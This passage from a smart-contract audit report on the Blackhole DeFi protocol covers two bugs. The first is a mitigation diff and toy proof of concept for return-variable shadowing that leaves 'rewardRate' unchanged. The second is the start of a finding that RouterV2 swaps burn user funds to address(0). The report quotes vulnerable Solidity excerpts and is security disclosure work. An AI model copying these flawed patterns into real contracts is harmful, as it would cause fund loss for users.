<h3 style="position:relative;" id="recommended-mitigation-steps-9"><a class="anchor before" aria-label="recommended mitigation steps 9 permalink" href="#recommended-mitigation-steps-9"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Rename the function return variable to avoid shadowing, or directly assign to the storage variable inside the function:</p>
<pre data-index="38" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">function notifyRewardAmount(address token, uint256 reward)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    external</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    nonReentrant</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    isNotEmergency</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    onlyDistribution</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk8">-   returns (IncentiveKey memory incentivekey, uint256 rewardRate, uint128 bonusRewardRate)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+   returns (IncentiveKey memory, uint256, uint128)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">{</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    require(token == address(rewardToken), "not rew token");</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    if (block.timestamp &gt;= _periodFinish) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        rewardRate = reward / DURATION;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    } else {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint256 remaining = _periodFinish - block.timestamp;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint256 leftover = remaining * rewardRate;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        rewardRate = (reward + leftover) / DURATION;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    _periodFinish = block.timestamp + DURATION;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    (IERC20Minimal rewardTokenAdd, IERC20Minimal bonusRewardTokenAdd, IAlgebraPool pool, uint256 nonce) =</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        algebraEternalFarming.incentiveKeys(poolAddress);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk8">-   incentivekey = IncentiveKey(rewardTokenAdd, bonusRewardTokenAdd, pool, nonce);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+   IncentiveKey memory incentivekey = IncentiveKey(rewardTokenAdd, bonusRewardTokenAdd, pool, nonce);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    bytes32 incentiveId = IncentiveId.compute(incentivekey);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    (,, address virtualPoolAddress,,,) = algebraEternalFarming.incentives(incentiveId);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk8">-   (,bonusRewardRate) = IAlgebraEternalVirtualPool(virtualPoolAddress).rewardRates();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+   (,uint128 bonusRewardRate) = IAlgebraEternalVirtualPool(virtualPoolAddress).rewardRates();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    rewardToken.safeTransferFrom(DISTRIBUTION, address(this), reward);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    IERC20(token).safeApprove(farmingParam.algebraEternalFarming, reward);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    algebraEternalFarming.addRewards(incentivekey, uint128(reward), 0);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    emit RewardAdded(reward);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+   return(incentivekey, rewardRate, bonusRewardRate);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<h3 style="position:relative;" id="proof-of-concept-5"><a class="anchor before" aria-label="proof of concept 5 permalink" href="#proof-of-concept-5"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<pre data-index="39" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// SPDX-License-Identifier: MIT</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">pragma</span><span class="mtk1"> </span><span class="mtk12">solidity</span><span class="mtk1"> ^</span><span class="mtk7">0.8</span><span class="mtk1">.</span><span class="mtk7">27</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">contract</span><span class="mtk1"> </span><span class="mtk12">ShadowedStorageExample</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">rewardRate</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">incrementRewardRate</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">rewardRate</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">rewardRate</span><span class="mtk1"> += </span><span class="mtk12">amount</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>No matter how you call <code>incrementRewardRate</code> with different values, the storage variable <code>rewardRate</code> will <strong>never change</strong>. This is because the function’s return variable <code>rewardRate</code> shadows the contract’s storage variable of the same name.</p>
<p>All updates inside the function only affect the local return variable, not the storage.
As a result, <code>rewardRate()</code> (the public getter) will always return <code>0</code>, regardless of how many times you call the function or what arguments you provide.</p>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-19">lonelybones</a>, <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-47">rayss</a> and <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-58">maxvzuvex</a>.</p>
<hr>
<hr>
<h2 style="position:relative;" id="m-09-zero-receiver-fund-burn"><a class="anchor before" aria-label="m 09 zero receiver fund burn permalink" href="#m-09-zero-receiver-fund-burn"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-188">[M-09] Zero-receiver fund burn</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-409">0x15</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L499-L530">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L499-L530</a></p>
<h3 style="position:relative;" id="finding-description-and-impact-1"><a class="anchor before" aria-label="finding description and impact 1 permalink" href="#finding-description-and-impact-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p>The <code>RouterV2</code> implementation has a fundamental flaw where tokens are burned to the zero address instead of being sent to the intended recipient.</p>
<p>The route struct includes a receiver field that defaults to <code>address(0)</code> when not explicitly set:</p>
<pre data-index="40" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">struct</span><span class="mtk1"> </span><span class="mtk12">route</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">from</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">stable</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">concentrated</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">receiver</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>In the <code>_swap</code> function, both swap paths use <code>routes[i].receiver</code> as the destination.</p>
<p>For concentrated pools, it’s used as the recipient parameter:</p>
<pre data-index="41" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">recipient: </span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">receiver</span></span></span></code></pre>
<p>For standard pools, it’s used in the swap call:</p>
<pre data-index="42" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">IBaseV1Pair</span><span class="mtk1">(</span><span class="mtk11">pairFor</span><span class="mtk1">(</span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">from</span><span class="mtk1">, </span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">stable</span><span class="mtk1">)).</span><span class="mtk11">swap</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                    </span><span class="mtk12">amount0Out</span><span class="mtk1">, </span><span class="mtk12">amount1Out</span><span class="mtk1">, </span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">receiver</span><span class="mtk1">, </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">bytes</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                );</span></span></span></code></pre>
<p>The critical issue is in how routes are constructed.</p>
<p>In <code>swapExactTokensForTokensSimple</code> routes are created with only <code>from</code>, <code>to</code>, <code>stable</code>, and <code>concentrated</code> fields set, but the receiver field is never populated:</p>
<pre data-index="43" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">route</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">routes</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">route</span><span class="mtk1">[](</span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk7">0</span><span class="mtk1">].</span><span class="mtk12">from</span><span class="mtk1"> = </span><span class="mtk12">tokenFrom</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk7">0</span><span class="mtk1">].</span><span class="mtk12">to</span><span class="mtk1"> = </span><span class="mtk12">tokenTo</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk7">0</span><span class="mtk1">].</span><span class="mtk12">stable</span><span class="mtk1"> = </span><span class="mtk12">stable</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk7">0</span><span class="mtk1">].</span><span class="mtk12">concentrated</span><span class="mtk1"> = </span><span class="mtk12">concentrated</span><span class="mtk1">;</span></span></span></code></pre>
<p>In <code>swapExactTokensForTokens</code> routes are passed directly from users who build them without setting the receiver field:</p>
<pre data-index="44" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1"> </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">swapExactTokensForTokens</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">amountIn</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">amountOutMin</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">route</span><span class="mtk1">[] </span><span class="mtk12">calldata</span><span class="mtk1"> </span><span class="mtk12">routes</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">deadline</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">ensure</span><span class="mtk1">(</span><span class="mtk12">deadline</span><span class="mtk1">) </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">amounts</span><span class="mtk1">) {</span></span></span></code></pre>
<p>Both functions pass the <code>_to</code> parameter to <code>_swap</code>, but it’s never used - the function only uses <code>routes[i].receiver</code>:</p>
<pre data-index="45" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_swap</span><span class="mtk1">(</span><span class="mtk12">uint</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">amounts</span><span class="mtk1">, </span><span class="mtk12">route</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">routes</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_to</span><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> </span><span class="mtk11">virtual</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">for</span><span class="mtk1"> (</span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">routes</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">if</span><span class="mtk1">(</span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">concentrated</span><span class="mtk1">){</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">from</span><span class="mtk1">).</span><span class="mtk11">allowance</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">), </span><span class="mtk12">swapRouter</span><span class="mtk1">) &lt; </span><span class="mtk12">amounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                    </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">from</span><span class="mtk1">).</span><span class="mtk11">approve</span><span class="mtk1">(</span><span class="mtk12">swapRouter</span><span class="mtk1">, </span><span class="mtk12">amounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">ISwapRouter</span><span class="mtk1">.</span><span class="mtk12">ExactInputSingleParams</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">inputParams</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">inputParams</span><span class="mtk1"> = </span><span class="mtk12">ISwapRouter</span><span class="mtk1">.</span><span class="mtk11">ExactInputSingleParams</span><span class="mtk1"> ({</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                    </span><span class="mtk12">tokenIn:</span><span class="mtk1"> </span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">from</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                    </span><span class="mtk12">tokenOut:</span><span class="mtk1"> </span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">to</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                    </span><span class="mtk12">deployer:</span><span class="mtk1"> </span><span class="mtk11">IAlgebraPoolAPIStorage</span><span class="mtk1">(</span><span class="mtk12">algebraPoolAPIStorage</span><span class="mtk1">).</span><span class="mtk11">pairToDeployer</span><span class="mtk1">(</span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">pair</span><span class="mtk1">),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                    </span><span class="mtk12">recipient:</span><span class="mtk1"> </span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">receiver</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                    </span><span class="mtk12">deadline:</span><span class="mtk1"> </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1"> + </span><span class="mtk7">600</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                    </span><span class="mtk12">amountIn:</span><span class="mtk1"> </span><span class="mtk12">amounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">],</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                    </span><span class="mtk12">amountOutMinimum:</span><span class="mtk1"> </span><span class="mtk7">0</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                    </span><span class="mtk12">limitSqrtPrice:</span><span class="mtk1"> </span><span class="mtk7">0</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                });</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">amounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">+</span><span class="mtk7">1</span><span class="mtk1">] = </span><span class="mtk11">ISwapRouter</span><span class="mtk1">(</span><span class="mtk12">swapRouter</span><span class="mtk1">).</span><span class="mtk11">exactInputSingle</span><span class="mtk1">(</span><span class="mtk12">inputParams</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">else</span><span class="mtk1">{</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                (</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">token0</span><span class="mtk1">,) = </span><span class="mtk11">sortTokens</span><span class="mtk1">(</span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">from</span><span class="mtk1">, </span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">to</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">amountOut</span><span class="mtk1"> = </span><span class="mtk12">amounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1"> + </span><span class="mtk7">1</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                (</span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">amount0Out</span><span class="mtk1">, </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">amount1Out</span><span class="mtk1">) = </span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">from</span><span class="mtk1"> == </span><span class="mtk12">token0</span><span class="mtk1"> ? (</span><span class="mtk11">uint</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk12">amountOut</span><span class="mtk1">) : (</span><span class="mtk12">amountOut</span><span class="mtk1">, </span><span class="mtk11">uint</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk11">IBaseV1Pair</span><span class="mtk1">(</span><span class="mtk11">pairFor</span><span class="mtk1">(</span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">from</span><span class="mtk1">, </span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">stable</span><span class="mtk1">)).</span><span class="mtk11">swap</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                    </span><span class="mtk12">amount0Out</span><span class="mtk1">, </span><span class="mtk12">amount1Out</span><span class="mtk1">, </span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">receiver</span><span class="mtk1">, </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">bytes</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">Swap</span><span class="mtk1">(</span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">amounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">], </span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">from</span><span class="mtk1">, </span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">receiver</span><span class="mtk1">, </span><span class="mtk12">routes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">].</span><span class="mtk12">stable</span><span class="mtk1">); </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>This results in 100% loss of user funds as all swapped tokens are sent to <code>address(0)</code> and permanently burned. Every swap transaction through these functions will fail to deliver tokens to users.</p>
<blockquote>
<p>Note: The API helper does correctly set receiver addresses in its <code>_createRoute</code> function:</p>
</blockquote>
<pre data-index="46" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1"> </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_createRoute</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">from</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">isBasic</span><span class="mtk1">, </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">amountOut</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_receiver</span><span class="mtk1">, </span><span class="mtk12">uint160</span><span class="mtk1"> </span><span class="mtk12">sqrtPriceAfter</span><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">route</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1">) 